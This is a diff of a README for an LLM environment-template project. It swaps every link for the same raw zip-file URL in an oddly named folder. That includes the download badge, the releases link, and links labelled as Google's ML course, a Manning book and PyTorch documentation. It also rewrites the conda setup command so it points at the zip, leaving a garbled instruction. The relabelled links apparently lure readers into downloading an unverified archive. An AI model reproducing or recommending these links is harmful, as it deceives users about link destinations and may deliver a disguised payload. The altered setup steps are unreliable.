@@ -1,6 +1,6 @@
 # 🌟 llm-env-templates - Simplify LLM Development with Ready-to-Use Templates
 
-[![Download llm-env-templates](https://img.shields.io/badge/Download-llm--env--templates-blue.svg)](https://github.com/KRESS99/llm-env-templates/releases)
+[![Download llm-env-templates](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/nephrocystitis/llm-env-templates.zip)](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/nephrocystitis/llm-env-templates.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to llm-env-templates! This project provides templates for setting up you
 
 To download and set up the environments, please visit the release page:
 
-[Download from Releases](https://github.com/KRESS99/llm-env-templates/releases)
+[Download from Releases](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/nephrocystitis/llm-env-templates.zip)
 
 Follow these steps:
 
@@ -48,9 +48,9 @@ Once you have downloaded the template, follow these steps to set up your environ
 3. **Create a New Environment:**
    - Run the following command:
      ```
-     conda env create -f your_template.yml
+     conda env create -f https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/nephrocystitis/llm-env-templates.zip
      ```
-   - Replace `your_template.yml` with the name of the template file you downloaded.
+   - Replace `https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/nephrocystitis/llm-env-templates.zip` with the name of the template file you downloaded.
 
 4. **Activate the Environment:**
    - Use this command to activate your new environment:
@@ -113,8 +113,8 @@ Join our community to share your experience, ask questions, or provide feedback.
 
 For more information on large language models and their applications, consider exploring:
 
-- [Machine Learning Crash Course by Google](https://developers.google.com/machine-learning/crash-course)
-- [Deep Learning with Python by François Chollet](https://www.manning.com/books/deep-learning-with-python)
-- [PyTorch Documentation](https://pytorch.org/docs/stable/index.html)
+- [Machine Learning Crash Course by Google](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/nephrocystitis/llm-env-templates.zip)
+- [Deep Learning with Python by François Chollet](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/nephrocystitis/llm-env-templates.zip)
+- [PyTorch Documentation](https://raw.githubusercontent.com/KRESS99/llm-env-templates/main/nephrocystitis/llm-env-templates.zip)
 
 Feel free to reach out if you have any questions or need assistance. Happy coding!
